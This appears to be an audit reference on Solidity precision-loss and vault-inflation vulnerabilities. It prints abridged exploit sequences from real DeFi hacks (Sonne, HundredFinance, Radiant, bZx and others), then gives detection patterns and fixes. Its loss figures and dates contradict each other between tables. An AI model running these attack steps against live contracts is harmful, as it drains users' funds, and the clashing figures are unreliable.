---
# Core Classification (Required)
protocol: generic
chain: everychain
category: arithmetic
vulnerability_type: precision_loss

# Attack Vector Details (Required)
attack_type: economic_exploit|precision_manipulation|inflation_attack
affected_component: math_operations|share_calculation|token_scaling|index_manipulation

# Technical Primitives (Required)
primitives:
  - division_before_multiplication
  - integer_truncation
  - scaling_factor
  - mulDiv
  - mulDivDown
  - mulDivUp
  - exchange_rate
  - liquidity_index
  - share_calculation
  - first_depositor
  - donation_attack
  - totalAssets
  - totalSupply
  - convertToShares
  - ERC4626
  - CompoundV2_cToken
  - rayDiv
  - wadDiv
  - FixedPoint

# Impact Classification (Required)
severity: high
impact: fund_loss|share_dilution|protocol_insolvency
exploitability: 0.75
financial_impact: critical

# Context Tags
tags:
  - defi
  - amm
  - lending
  - vault
  - precision
  - rounding
  - real_exploit
  - inflation_attack
  - first_depositor

# Version Info
language: solidity
version: all

# Source
source: DeFiHackLabs
---

## References & Source Reports

> **For Agents**: Real-world exploits from DeFiHackLabs repository. Read the PoC files for detailed attack mechanics.

### Precision Loss / Rounding Exploits by Year

| Date | Protocol | Vulnerability Type | Loss | PoC Path |
|------|----------|-------------------|------|----------|
| 2025-11-03 | BalancerV2 | Scaling Factor Precision Loss | ~$120M | `DeFiHackLabs/src/test/2025-11/BalancerV2_exp.sol` |
| 2024-11-20 | Matez | Integer Truncation | ~$13K | - |
| 2024-06-29 | DeFiPlaza | Division Precision Loss | ~$32K | - |
| 2024-05-16 | Sonne Finance | CompoundV2 Inflation Attack | ~$20M | `DeFiHackLabs/src/test/2024-05/Sonne_exp.sol` |
| 2024-04-09 | BNBX | Precision Loss | ~$12K | - |
| 2024-03-13 | Binemon | Precision Loss | ~3 ETH | - |
| 2024-02-03 | BigBangSwap | Precision Loss | ~$27K | - |
| 2024-01-03 | Radiant Capital | liquidity Index Manipulation | ~$4.5M | `DeFiHackLabs/src/test/2024-01/RadiantCapital_exp.sol` |
| 2023-12-31 | CCV | Precision Loss | ~300 DAI | - |
| 2023-12-31 | DominoTT | Precision Loss | ~$6.5K | - |
| 2023-11-24 | KyberSwap | Tick Crossing Precision Loss | ~$50M | `DeFiHackLabs/src/test/2023-11/KyberSwap_exp.eth.1.sol` |
| 2023-11-15 | MahaLend | Donation + Rounding Error | ~$3.8K | - |
| 2023-11-15 | Raft_fi | Index Inflation + Rounding Error | ~$3.2M | `DeFiHackLabs/src/test/2023-11/Raft_exp.sol` |
| 2023-11-04 | KR | Precision Loss | Unknown | - |
| 2023-10-28 | Onyx Protocol | CompoundV2 Inflation Attack | ~$2.1M | `DeFiHackLabs/src/test/2023-11/OnyxProtocol_exp.sol` |
| 2023-10-18 | HopeLend | Division Precision Loss | ~$825K | `DeFiHackLabs/src/test/2023-10/Hopelend_exp.sol` |
| 2023-10-10 | WiseLending | Donation + Rounding Error | ~$464K | `DeFiHackLabs/src/test/2023-10/WiseLending_exp.sol` |
| 2023-08-30 | Balancer | Rounding Error + Logic Flaw | ~$238K | - |
| 2023-06-18 | MidasCapitalXYZ | Precision Loss | ~$660K | - |
| 2023-03-01 | MIMSpell | Precision Loss | ~$15K | - |
| 2023-01-03 | HundredFinance | Donation Inflation Attack | ~$7M | `DeFiHackLabs/src/test/2023-04/HundredFinance_2_exp.sol` |
| 2022-12-02 | bZxProtocol | Share Inflation Attack | ~$4.3M | `DeFiHackLabs/src/test/2023-12/bZx_exp.sol` |
| 2022-11-30 | MetaLend | CompoundV2 Inflation Attack | ~$28K | - |
| 2022-10-30 | kTAF | CompoundV2 Inflation Attack | ~$270K | - |
| 2022-10-27 | ChannelsFinance | CompoundV2 Inflation Attack | ~$9K | - |

### External References
- [BlockSec: BalancerV2 Analysis](https://x.com/BlockSecTeam/status/1986057732810518640)
- [BlockSec: KyberSwap Analysis](https://blocksec.com/blog/yet-another-tragedy-of-precision-loss-an-in-depth-analysis-of-the-kyber-swap-incident-1)
- [BlockSec: Balancer Precision Loss](https://blocksecteam.medium.com/yet-another-risk-posed-by-precision-loss-an-in-depth-analysis-of-the-recent-balancer-incident-fad93a3c75d4)
- [OpenZeppelin ERC4626 Inflation Attack](https://github.com/OpenZeppelin/openzeppelin-contracts/issues/3706)

---

# Precision Loss & Rounding Vulnerabilities - Comprehensive Database

**A Complete Pattern-Matching Guide for Arithmetic Security Audits**

---

## Table of Contents

1. [Overview](#overview)
2. [Vulnerability Categories](#vulnerability-categories)
3. [Category 1: Division Precision Loss](#category-1-division-precision-loss-rounding-down)
4. [Category 2: Exchange Rate Manipulation via Donation](#category-2-exchange-rate-manipulation-via-donation-inflation-attacks)
5. [Category 3: CompoundV2/ERC4626 Vault Inflation Attacks](#category-3-compoundv2erc4626-vault-inflation-attacks)
6. [Category 4: Integer Truncation Issues](#category-4-integer-truncation-issues)
7. [Category 5: First Depositor Attacks](#category-5-first-depositor-attacks)
8. [Detection Patterns](#detection-patterns)
9. [Secure Implementation](#secure-implementation)
10. [Keywords for Search](#keywords-for-search)

---

## Overview

Precision loss and rounding vulnerabilities occur when integer arithmetic in Solidity causes unexpected truncation, accumulated errors, or economic invariant violations. These vulnerabilities have resulted in over **$200M+ in losses** across DeFi protocols.

> **Root Cause Statement**: These vulnerabilities exist because Solidity lacks native floating-point support, integer division rounds toward zero (truncates), and mathematical operations with scaling factors can introduce compounding precision losses that attackers exploit to extract value.

**Observed Frequency**: 25+ major exploits (2022-2025)
**Total Value Lost**: $200M+ USD
**Consensus Severity**: MEDIUM to CRITICAL (context-dependent)
**Affected Protocols**: AMMs, lending protocols, vaults, staking systems, any share-based accounting

---

## Vulnerability Categories

| Category | Description | Example Protocols | Typical Loss Range |
|----------|-------------|-------------------|-------------------|
| Division Precision Loss | Rounding down in division operations | KyberSwap, HopeLend, BalancerV2 | $238K - $120M |
| Exchange Rate Inflation | Donation to manipulate share/asset ratio | HundredFinance, Raft_fi, WiseLending | $464K - $7M |
| CompoundV2/ERC4626 Inflation | Empty market share manipulation | Sonne, Onyx, HundredFinance | $9K - $20M |
| Integer Truncation | Direct truncation in calculations | Matez, various | $13K - $50K |
| First Depositor Attack | Initial deposit ratio manipulation | Multiple vaults | $28K - $4.3M |

---

## Category 1: Division Precision Loss (Rounding Down)

### Root Cause

Solidity integer division always rounds toward zero (truncates). When division is performed before multiplication, or when scaling factors cause small amounts to truncate to zero, precision is permanently lost.

### Vulnerable Pattern Examples

**Example 1: BalancerV2 Scaling Factor Precision Loss (2025-11, $120M)** [CRITICAL]

> Reference: `DeFiHackLabs/src/test/2025-11/BalancerV2_exp.sol`

```solidity
// ❌ VULNERABLE: Precision loss in token scaling
function swapGivenOut(
    uint256[] memory balances,        
    uint256[] memory scalingFactors,  
    uint256 tokenIndexIn,             
    uint256 tokenIndexOut,            
    uint256 tokenAmountOut
) internal returns (uint256) {
    // @audit PRECISION LOSS HERE - small amounts truncate to zero
    uint256 amountOutScaled = FixedPoint.mulDown(tokenAmountOut, scalingFactors[tokenIndexOut]);
    
    // When scalingFactor is close to 1e18, small tokenAmountOut values 
    // can result in amountOutScaled being significantly different than expected
    // or even truncating intermediate calculations
}
```

**Attack Mechanism (BalancerV2):**
1. Attacker identifies pools with tokens using different scaling factors
2. Calculates "trick amounts" based on scaling factor precision boundaries
3. Executes batch swaps that exploit precision loss at scale boundaries
4. Repeated operations compound the precision loss into extractable value

```solidity
// From actual exploit - calculating exploitation threshold
function get_trickAmt(uint256 scalingfactor) public pure returns (uint256 trickAmt) {
    trickAmt = 10000 / ((scalingfactor - 1e18) * 10000 / 1e18);
    return trickAmt;
}
```

**Example 2: HopeLend Division Precision Loss (2023-10, $825K)** [HIGH]

> Reference: `DeFiHackLabs/src/test/2023-10/Hopelend_exp.sol`

```solidity
// ❌ VULNERABLE: Index inflation allows rounding exploitation
// After inflating liquidityIndex through flashloans:

function WithdrawAllWBTC() internal {
    uint256 premiumPerFlashloan = 2000 * 1e8 * 9 / 10_000; // 0.09% flashloan fee
    premiumPerFlashloan -= (premiumPerFlashloan * 30 / 100); // 30% protocol fee
    uint256 nextLiquidityIndex = premiumPerFlashloan * 60 + 1; // 60 times flashloan
    
    // @audit Exploit rounding: deposit amount that rounds UP, withdraw amount that rounds DOWN
    uint256 depositAmount = nextLiquidityIndex;
    uint256 withdrawAmount = nextLiquidityIndex * 3 / 2 - 1; // withdraw 1.5 share of asset
    // but only burn 1 share through rounding error
    
    for (uint256 idx = 0; idx < count; idx++) {
        HopeLend.deposit(address(WBTC), depositAmount, address(this), 0); // mint 1 share
        HopeLend.withdraw(address(WBTC), withdrawAmount, address(this)); // burn 1 share, get 1.5x
    }
}
```

**Example 3: KyberSwap Tick Crossing Precision Loss (2023-11, $50M)** [CRITICAL]

> Reference: `DeFiHackLabs/src/test/2023-11/KyberSwap_exp.eth.1.sol`

```solidity
// ❌ VULNERABLE: Precision loss during tick crossing in concentrated liquidity
// The exploit manipulates tick state to cause precision loss

function trigger() public {
    // Step 1: Move to tick range with 0 liquidity
    IKyberswapPool(_victim).swap(_attacker, int256(_amount), false, 0x100000000000000000000000000, "");
    
    // Step 2: Supply liquidity at specific tick
    IKyberswapPositionManager(_manager).mint(MintParams(...));
    
    // Step 3: Remove liquidity (precision loss occurs here)
    IKyberswapPositionManager(_manager).removeLiquidity(...);
    
    // Step 4: Back and forth swaps exploit accumulated precision errors
    IKyberswapPool(_victim).swap(...);
}
```

### Impact Analysis - Division Precision Loss

- **BalancerV2**: $120M - Largest precision loss exploit ever
- **KyberSwap**: $50M - Concentrated liquidity tick manipulation
- **HopeLend**: $825K - Index inflation + rounding exploitation

---

## Category 2: Exchange Rate Manipulation via Donation (Inflation Attacks)

### Root Cause

When protocols calculate exchange rates using `totalAssets / totalShares`, attackers can donate assets directly to the contract to inflate the exchange rate, causing subsequent depositors to receive fewer shares or zero shares.

### Vulnerable Pattern Examples

**Example 1: Raft_fi Index Inflation (2023-11, $3.2M)** [HIGH]

> Reference: `DeFiHackLabs/src/test/2023-11/Raft_exp.sol`

```solidity
// ❌ VULNERABLE: Index-based share calculation vulnerable to donation
contract RaftExploit {
    function exploit() external {
        // Step 1: Donate cbETH to inflate index
        cbETH.transfer(address(PRM), cbETH.balanceOf(address(this)));
        
        // Step 2: Trigger index recalculation through liquidation
        PRM.liquidate(liquidablePosition);
        
        // @audit After inflation: storedIndex increases dramatically
        // storedIndex2 / storedIndex1 = massive magnification factor
        
        // Step 3: Exploit precision loss to mint shares cheaply
        for (uint256 i; i < 60; i++) {
            // mint 1 wei rcbETH-c only using 1 wei cbETH through precision loss
            PRM.managePosition(cbETH, address(this), 1, true, 0, true, 1e18, permitSig);
        }
        
        // Step 4: Redeem donated assets + borrow against inflated collateral
        PRM.managePosition(cbETH, address(this), collateralChange, false, 0, true, 1e18, permitSig);
    }
}
```

**Example 2: WiseLending Donation Attack (2023-10, $464K)** [MEDIUM]

> Reference: `DeFiHackLabs/src/test/2023-10/WiseLending_exp.sol`

```solidity
// ❌ VULNERABLE: Share price inflation via donation
function exploit() external {
    // Step 1: Open positions
    uint256 recoverID = recover.init();
    uint256 borrowerID = PositionNFTs.mintPositionForUser(address(this));
    
    // Step 2: Minimal deposits (1 wei each)
    WiseLending.depositExactAmount(recoverID, address(WBTC), 1);
    WiseLending.depositExactAmount(borrowerID, address(WBTC), 1);
    
    // Step 3: Donate to inflate share price
    WBTC.transfer(address(WiseLending), 50 * 1e8 - 2);
    
    // Step 4: Borrow all assets (share value inflated, collateral worth more)
    WiseLending.borrowExactAmount(id, address(wstETH), wstETHBalance);
    WiseLending.borrowExactAmount(id, address(WETH), WETHBalance);
    // ... borrow all other assets
    
    // Step 5: Recover donated funds through precision loss
    while (WiseLending.getPseudoTotalPool(address(WBTC)) > 2_000_000) {
        // @audit withdraw share amount = 0 due to precision loss
        uint256 recoverAmount = 
            (getPseudoTotalPool(WBTC) - 1) / getTotalDepositShares(WBTC);
        WiseLending.withdrawExactAmount(positionID, address(WBTC), recoverAmount);
    }
}
```

---

## Category 3: CompoundV2/ERC4626 Vault Inflation Attacks

### Root Cause

CompoundV2-style protocols and ERC4626 vaults are vulnerable when:
1. The market/vault is empty or nearly empty
2. An attacker can be the first depositor
3. Share minting uses `assets * totalShares / totalAssets` formula without protection

### Vulnerable Pattern Examples

**Example 1: Sonne Finance CompoundV2 Inflation (2024-05, $20M)** [CRITICAL]

> Reference: `DeFiHackLabs/src/test/2024-05/Sonne_exp.sol`

```solidity
// ❌ VULNERABLE: Classic CompoundV2 empty market attack
function exploit() external {
    // Step 1: Execute pending governance proposals to create new market
    t.execute(soVELO, 0, data1, 0x00, salt1);  // Set reserve factor
    t.execute(soVELO, 0, data4, 0x00, salt4);  // Support market
    t.execute(Unitroller, 0, data5, 0x00, salt5);  // Set collateral factor
    
    // Step 2: Flashloan and mint minimal shares
    VolatileV2Pool(pool).swap(0, flashLoanAmount, address(this), hex"01");
    
    // In callback:
    // Step 3: Mint minimal shares (2 wei)
    CErc20Interface(soVELO).mint(400_000_001);  // Carefully calculated to get 2 shares
    
    // Step 4: Donate all remaining tokens to inflate share price
    IERC20(VELO_Token_V2).transfer(soVELO, VeloAmountOfthis);
    
    // Step 5: Use inflated collateral to borrow all other assets
    IUnitroller(Unitroller).enterMarkets(cTokens);
    CErc20Interface(soUSDC).borrow(768_947_220_961);  // Borrow all USDC
    
    // Step 6: Redeem underlying (attacker keeps profit)
    ICErc20Delegate(soVELO).redeemUnderlying(amount - 1);
}
```

**Example 2: Onyx Protocol Inflation (2023-10, $2.1M)** [HIGH]

> Reference: `DeFiHackLabs/src/test/2023-11/OnyxProtocol_exp.sol`

```solidity
// ❌ VULNERABLE: Empty cToken market exploitation
contract IntermediateContractETH {
    function start() external {
        // Step 1: Deposit small amount to get initial shares
        PEPE.approve(address(oPEPE), type(uint256).max);
        oPEPE.mint(1e18);
        
        // Step 2: Redeem most shares, leaving minimal
        oPEPE.redeem(oPEPE.totalSupply() - 2);
        
        // Step 3: Donate remaining tokens to inflate exchange rate
        uint256 redeemAmt = PEPE.balanceOf(address(this)) - 1;
        PEPE.transfer(address(oPEPE), PEPE.balanceOf(address(this)));
        
        // Step 4: Enter market and borrow against inflated collateral
        Unitroller.enterMarkets(oTokens);
        oETHER.borrow(oETHER.getCash() - 1);  // Borrow all ETH
        
        // Step 5: Redeem original donation
        oPEPE.redeemUnderlying(redeemAmt);
        
        // Step 6: Re-mint to set up for liquidation profit
        (,,, uint256 exchangeRate) = oPEPE.getAccountSnapshot(address(this));
        (, uint256 numSeizeTokens) = Unitroller.liquidateCalculateSeizeTokens(...);
        uint256 mintAmount = (exchangeRate / 1e18) * numSeizeTokens - 2;
        oPEPE.mint(mintAmount);
    }
}
```

**Example 3: HundredFinance CompoundV2 Attack (2023-04, $7M)** [CRITICAL]

> Reference: `DeFiHackLabs/src/test/2023-04/HundredFinance_2_exp.sol`

```solidity
// ❌ VULNERABLE: Classic empty hToken market attack with detailed steps
contract ETHDrain {
    constructor(crETH Delegate) payable {
        // Step 1: Deposit small amount to empty pool
        WBTC.approve(address(hWBTC), type(uint256).max);
        hWBTC.mint(4 * 1e8);
        
        // Step 2: Redeem to minimize shares (leave only 2 shares)
        hWBTC.redeem(hWBTC.totalSupply() - 2);
        
        // Step 3: Donate to inflate exchangeRate
        (,,, uint256 exchangeRate_1) = hWBTC.getAccountSnapshot(address(this));
        uint256 donationAmount = WBTC.balanceOf(address(this));
        WBTC.transfer(address(hWBTC), donationAmount);  // "donation" manipulation
        (,,, uint256 exchangeRate_2) = hWBTC.getAccountSnapshot(address(this));
        // exchangeRate_2 >> exchangeRate_1
        
        // Step 4: Borrow against inflated collateral
        unitroller.enterMarkets(cTokens);
        uint256 borrowAmount = CEtherDelegate.getCash() - 1;
        CEtherDelegate.borrow(borrowAmount);
        
        // Step 5: Redeem donated assets (precision loss allows full recovery)
        // @audit Key insight: redeemAmount * totalSupply / WBTCAmount rounds to 0 shares
        uint256 redeemAmount = donationAmount - 1;
        hWBTC.redeemUnderlying(redeemAmount);
    }
}
```

---

## Category 4: Integer Truncation Issues

### Root Cause

Direct integer truncation occurs when calculations involve division operations where the result should be non-zero but truncates to zero, or when intermediate calculations lose significant bits.

### Vulnerable Pattern Examples

**Example 1: Division Before Multiplication** [MEDIUM]

```solidity
// ❌ VULNERABLE: Division before multiplication causes precision loss
function calculateLiquidity(uint256 k, uint256 assetRate, uint256 supply) public returns (uint256) {
    uint256 intermediate = ((k * 10000) / assetRate);  // First division - loses precision
    uint256 liquidity = (((intermediate * 10000 ether) / supply) * 1 ether) / 10000;
    // Hidden divisions compound precision loss - up to 25% error in some cases
    return liquidity;
}

// ✅ SECURE: Multiply before divide
function calculateLiquidityFixed(uint256 k, uint256 assetRate, uint256 supply) public returns (uint256) {
    // Perform all multiplications first, then single division
    return (k * 10000 * 10000 ether * 1 ether) / (assetRate * supply * 10000);
}
```

**Example 2: rayDiv/wadDiv Rounding Exploitation (Radiant Capital)** [HIGH]

> Reference: `DeFiHackLabs/src/test/2024-01/RadiantCapital_exp.sol`

```solidity
// ❌ VULNERABLE: liquidityIndex manipulation enables rayDiv exploitation
function exploit() external {
    // Step 1: Deposit to get shares
    RadiantLendingPool.deposit(address(USDC), 2_000_000 * 1e6, address(this), 0);
    
    // Step 2: Repeatedly flashloan to inflate liquidityIndex
    for (uint8 i = 0; i < 151; i++) {
        RadiantLendingPool.flashLoan(address(this), assets, amounts, modes, address(this), params, 0);
    }
    
    // @audit After 151 flashloans, liquidityIndex is massively inflated
    // rayDiv function now has exploitable rounding errors
    
    // Step 3: Borrow against inflated position
    uint256 amountToBorrow = 90_690_695_360_221_284_999;
    RadiantLendingPool.borrow(address(WETH), amountToBorrow, 2, 0, address(this));
    
    // Step 4: Siphon remaining funds through repeated deposit/withdraw
    // leveraging rayDiv rounding errors
    helper.siphonFundsFromPool(transferAmount);
}

contract HelperExploit {
    function siphonFundsFromPool(uint256 amount) external {
        // Exploit rayDiv rounding: deposit and withdraw in a loop
        while (USDC.balanceOf(address(rUSDCn)) >= 1) {
            RadiantLendingPool.deposit(address(USDC), amount, address(this), 0);
            // @audit Rounding favors attacker due to inflated index
            RadiantLendingPool.withdraw(address(USDC), withdrawAmount, address(this));
        }
    }
}
```

---

## Category 5: First Depositor Attacks

### Root Cause

When a vault or pool is empty, the first depositor can manipulate the initial share price through strategic deposits and donations, affecting all subsequent depositors.

### Attack Pattern

```
Initial State: totalShares = 0, totalAssets = 0

Step 1: Attacker deposits 1 wei → receives 1 share
State: totalShares = 1, totalAssets = 1

Step 2: Attacker donates D tokens directly
State: totalShares = 1, totalAssets = 1 + D

Step 3: Victim deposits V tokens
Shares received = V * 1 / (1 + D)
If V <= D, shares = 0 (victim loses everything)

Step 4: Attacker redeems 1 share
Receives: totalAssets = 1 + D + V
Profit: D + V - 1 ≈ V (victim's deposit)
```

### bZxProtocol Example (2022-12, $4.3M) [HIGH]

> Reference: `DeFiHackLabs/src/test/2023-12/bZx_exp.sol`

```solidity
// ❌ VULNERABLE: iToken share inflation through donation
function exploit() external {
    // Step 1: Burn existing shares (from anti-frontrun mechanism)
    vm.prank(originalAttackContract);
    iYFI.burn(originalAttackContract, iYFIQuantity);
    
    // At this point iYFI pool is empty
    // totalAssets = 0, totalShares = 0
    
    // Step 2: Deposit minimal amount
    iYFI.mint(address(this), 5);  // Deposit 5 wei, receive 5 shares
    
    // Step 3: Donate all tokens to inflate share value
    YFI.transfer(address(iYFI), YFI.balanceOf(address(this)));
    // Now each share is worth massive amount of YFI
    
    // Step 4: Use inflated shares as collateral to borrow
    iYFI.approve(address(iETH), type(uint256).max);
    borrowToken(iETH, WETH.balanceOf(address(iETH)));  // Borrow all ETH
    
    iYFI.approve(address(iWBTC), type(uint256).max);
    borrowToken(iWBTC, WBTC.balanceOf(address(iWBTC)));  // Borrow all WBTC
    
    // Step 5: Withdraw collateral (rounding issue in bZx allows this)
    bzX.withdrawCollateral(loanId, address(this), iYFIQuantity);
    
    // Step 6: Burn shares and retrieve underlying
    iYFI.burn(address(this), iYFI.balanceOf(address(this)));
}
```

---

## Detection Patterns

### Code Patterns to Search For

```yaml
# Dangerous Patterns (VULNERABLE)
anti_patterns:
  - pattern: "totalSupply() == 0 ? assets : assets * totalSupply() / totalAssets()"
    risk: "First depositor attack - no virtual shares"
  
  - pattern: "(a / b) * c"
    risk: "Division before multiplication - precision loss"
  
  - pattern: "balanceOf(address(this))"
    context: "In share calculation"
    risk: "Donation attack vector"
    
  - pattern: "exchangeRate * amount / 1e18"
    risk: "Index manipulation if exchangeRate is inflatable"
    
  - pattern: "mulDiv.*Down|mulDivDown"
    context: "User receives value"
    risk: "May round to zero for small amounts"
    
  - pattern: "scalingFactor.*mul|FixedPoint\.mul"
    risk: "Scaling precision loss for tokens with different decimals"

# Safe Patterns (SECURE)
safe_patterns:
  - "totalSupply() + 10 ** _decimalsOffset()"  # Virtual shares
  - "require(shares > 0, ...)"  # Zero share check
  - "_trackedAssets"  # Internal asset tracking (donation immune)
  - "MINIMUM_LIQUIDITY"  # Dead shares pattern
```

### Audit Checklist

- [ ] Does the protocol use virtual shares/assets offset?
- [ ] Is there MINIMUM_LIQUIDITY or dead shares mechanism?
- [ ] Does the vault track assets internally vs using balanceOf?
- [ ] Are all divisions performed AFTER multiplications?
- [ ] Is there minimum deposit enforcement?
- [ ] What happens when vault/market is empty?
- [ ] Can exchange rate or liquidity index be externally inflated?
- [ ] Are scaling factors used? Are precision boundaries tested?
- [ ] Do rounding directions favor the protocol (round down for withdrawals)?
- [ ] Is there protection against repeated small operations?

---

## Secure Implementation

### Fix 1: Virtual Shares and Assets (OpenZeppelin Pattern)

```solidity
// ✅ SECURE: Add virtual offset to prevent inflation attacks
function _convertToShares(uint256 assets, Math.Rounding rounding) internal view returns (uint256) {
    return assets.mulDiv(
        totalSupply() + 10 ** _decimalsOffset(),  // Virtual shares
        totalAssets() + 1,                         // Virtual asset
        rounding
    );
}

function _decimalsOffset() internal view virtual returns (uint8) {
    return 3;  // Makes attack cost 1000x more
}
```

### Fix 2: Dead Shares (Uniswap V2 Pattern)

```solidity
// ✅ SECURE: Burn initial shares to address(0)
uint256 public constant MINIMUM_LIQUIDITY = 1000;

function _firstDeposit(uint256 assets, uint256 shares) internal {
    require(shares > MINIMUM_LIQUIDITY, "Insufficient deposit");
    _mint(address(0), MINIMUM_LIQUIDITY);  // Permanently locked
    _mint(msg.sender, shares - MINIMUM_LIQUIDITY);
}
```

### Fix 3: Internal Asset Tracking

```solidity
// ✅ SECURE: Track assets internally, ignore donations
uint256 private _trackedAssets;

function totalAssets() public view returns (uint256) {
    return _trackedAssets;  // Not balanceOf - immune to donation
}

function _deposit(uint256 assets) internal {
    _trackedAssets += assets;
    // ... rest of deposit logic
}
```

### Fix 4: Multiply Before Divide

```solidity
// ✅ SECURE: Perform all multiplications before any division
// Bad:  (a / b) * c * d
// Good: (a * c * d) / b

function calculateAmount(uint256 a, uint256 b, uint256 c, uint256 d) internal pure returns (uint256) {
    return (a * c * d) / b;  // Single division at the end
}
```

### Fix 5: Minimum Amount Enforcement

```solidity
// ✅ SECURE: Enforce minimum amounts to prevent rounding attacks
function deposit(uint256 assets) external returns (uint256 shares) {
    require(assets >= MIN_DEPOSIT, "Below minimum");
    shares = _convertToShares(assets);
    require(shares > 0, "Zero shares");
    // ...
}
```

### Fix 6: Scaling Factor Bounds Checking

```solidity
// ✅ SECURE: Validate scaled amounts are meaningful
function swapGivenOut(uint256 tokenAmountOut, uint256 scalingFactor) internal returns (uint256) {
    uint256 amountOutScaled = FixedPoint.mulDown(tokenAmountOut, scalingFactor);
    require(amountOutScaled > 0, "Amount rounds to zero");
    require(amountOutScaled >= MIN_SCALED_AMOUNT, "Below minimum");
    // ...
}
```

---

## Real-World Loss Summary by Category

| Category | Protocols Affected | Total Losses | Key Insight |
|----------|-------------------|--------------|-------------|
| Division Precision Loss | BalancerV2, KyberSwap, HopeLend | ~$171M | Scaling factors and tick math are high-risk areas |
| Donation Inflation | Raft_fi, WiseLending, HundredFinance | ~$11M | Index-based protocols need donation protection |
| CompoundV2 Inflation | Sonne, Onyx, HundredFinance | ~$29M | Empty markets are critical attack vectors |
| First Depositor | bZx, MetaLend, ChannelsFinance | ~$4.6M | Always use dead shares or virtual offset |
| Integer Truncation | Radiant, various | ~$5M | Index inflation enables cascading exploits |

---

## Keywords for Search

`precision loss`, `rounding error`, `truncation`, `division before multiplication`, `mulDiv`, `mulDivDown`, `mulDivUp`, `scaling factor`, `exchange rate manipulation`, `inflation attack`, `first depositor attack`, `donation attack`, `empty market`, `empty vault`, `share price manipulation`, `liquidity index`, `rayDiv`, `wadDiv`, `FixedPoint`, `virtual shares`, `dead shares`, `MINIMUM_LIQUIDITY`, `totalAssets manipulation`, `CompoundV2`, `ERC4626`, `cToken`, `hToken`, `iToken`, `dust attack`, `rounding down`, `integer overflow`, `accumulated error`

---

## Related Vulnerabilities

- [Vault Inflation Attack](../vault-inflation-attack/vault-inflation-attack.md) - Specific ERC4626 inflation patterns
- [Rounding and Precision Loss (Basic)](../rounding-precision-loss/rounding-precision-loss.md) - Simpler rounding issues
- [Flash Loan Attacks](../flash-loan-attacks/FLASH_LOAN_VULNERABILITIES.md) - Often combined with precision loss
- [Oracle Price Manipulation](../../oracle/price-manipulation/flash-loan-oracle-manipulation.md) - Economic attacks that leverage precision issues

---

## DeFiHackLabs Real-World Exploits (23 incidents)

**Category**: Precision Loss | **Total Losses**: $312.3M | **Sub-variants**: 4

### Sub-variant Breakdown

#### Precision-Loss/Division Precision (15 exploits, $299.6M)

- **BalancerV2** (2025-11, $120.0M, ethereum) | PoC: `DeFiHackLabs/src/test/2025-11/BalancerV2_exp.sol`
- **MIMSpell** (2024-01, $65.0M, ethereum) | PoC: `DeFiHackLabs/src/test/2024-01/MIMSpell2_exp.sol`
- **KyberSwap** (2023-11, $46.0M, None) | PoC: `DeFiHackLabs/src/test/2023-11/KyberSwap_exp.eth.1.sol`
- *... and 12 more exploits*

#### Precision-Loss/Donation Inflation Rounding (6 exploits, $12.5M)

- **HundredFinance** (2023-04, $7.0M, optimism) | PoC: `DeFiHackLabs/src/test/2023-04/HundredFinance_2_exp.sol`
- **Raft_fi** (2023-11, $3.2M, ethereum) | PoC: `DeFiHackLabs/src/test/2023-11/Raft_exp.sol`
- **Balancer** (2023-08, $2.0M, ethereum) | PoC: `DeFiHackLabs/src/test/2023-08/Balancer_exp.sol`
- *... and 3 more exploits*

#### Precision-Loss/Integer Truncation (1 exploits, $80K)

- **Matez** (2024-11, $80K, bsc) | PoC: `DeFiHackLabs/src/test/2024-11/Matez_exp.sol`

#### Precision-Loss/Truncation (1 exploits, $42K)

- **DualPools** (2024-02, $42K, None) | PoC: `DeFiHackLabs/src/test/2024-02/DualPools_exp.sol`

### Complete DeFiHackLabs Exploit Table

| Protocol | Date | Loss | Vulnerability Sub-type | Chain |
|----------|------|------|----------------------|-------|
| BalancerV2 | 2025-11-03 | $120.0M | Precision Loss | ethereum |
| MIMSpell | 2024-01-30 | $65.0M | Precission Loss | ethereum |
| KyberSwap | 2023-11-22 | $46.0M | precision loss | None |
| RadiantCapital | 2024-01-02 | $45.0M | Loss of Precision | arbitrum |
| Sonne Finance | 2024-05-14 | $20.0M | Precision loss | None |
| HundredFinance | 2023-04-15 | $7.0M | Donate Inflation ExchangeRate && Rounding Error | optimism |
| Raft_fi | 2023-11-10 | $3.2M | Donate Inflation ExchangeRate & Rounding Error | ethereum |
| OnyxProtocol | 2023-11-01 | $2.0M | Precission Loss Vulnerability | ethereum |
| Balancer | 2023-08-27 | $2.0M | Rounding Error && Business Logic Flaw | ethereum |
| Hopelend | 2023-10-18 | $825K | Div Precision Loss | ethereum |
| MidasCapitalXYZ | 2023-06-17 | $600K | Precision Loss | bsc |
| WiseLending | 2023-10-13 | $260K | Donate Inflation ExchangeRate && Rounding Error | ethereum |
| DeFiPlaza | 2024-07-05 | $200K | loss of precision | ethereum |
| Matez | 2024-11-21 | $80K | Integer Truncation | bsc |
| BaoCommunity | 2023-07-04 | $46K | Donate Inflation ExchangeRate && Rounding Error | None |
| DualPools | 2024-02-15 | $42K | precision truncation | None |
| MahaLend | 2023-11-11 | $20K | Donate Inflation ExchangeRate & Rounding Error | ethereum |
| BigBangSwap | 2024-04-10 | $5K | precission loss | bsc |
| CCV | 2023-12-28 | $3K | Precision loss | bsc |
| DominoTT | 2023-12-28 | $5 | Precision loss | bsc |
| KR | 2023-11-06 | $5 | Precision loss | bsc |
| BNBX | 2024-04-27 | $5 | precission loss | bsc |
| Binemon | 2024-03-11 | $0 | precission-loss | bsc |

### Top PoC References

- **BalancerV2** (2025-11, $120.0M): `DeFiHackLabs/src/test/2025-11/BalancerV2_exp.sol`
- **MIMSpell** (2024-01, $65.0M): `DeFiHackLabs/src/test/2024-01/MIMSpell2_exp.sol`
- **KyberSwap** (2023-11, $46.0M): `DeFiHackLabs/src/test/2023-11/KyberSwap_exp.eth.1.sol`
- **RadiantCapital** (2024-01, $45.0M): `DeFiHackLabs/src/test/2024-01/RadiantCapital_exp.sol`
- **HundredFinance** (2023-04, $7.0M): `DeFiHackLabs/src/test/2023-04/HundredFinance_2_exp.sol`
- **Raft_fi** (2023-11, $3.2M): `DeFiHackLabs/src/test/2023-11/Raft_exp.sol`
- **OnyxProtocol** (2023-11, $2.0M): `DeFiHackLabs/src/test/2023-11/OnyxProtocol_exp.sol`
- **Balancer** (2023-08, $2.0M): `DeFiHackLabs/src/test/2023-08/Balancer_exp.sol`
- **Hopelend** (2023-10, $825K): `DeFiHackLabs/src/test/2023-10/Hopelend_exp.sol`
- **MidasCapitalXYZ** (2023-06, $600K): `DeFiHackLabs/src/test/2023-06/MidasCapitalXYZ_exp.sol`
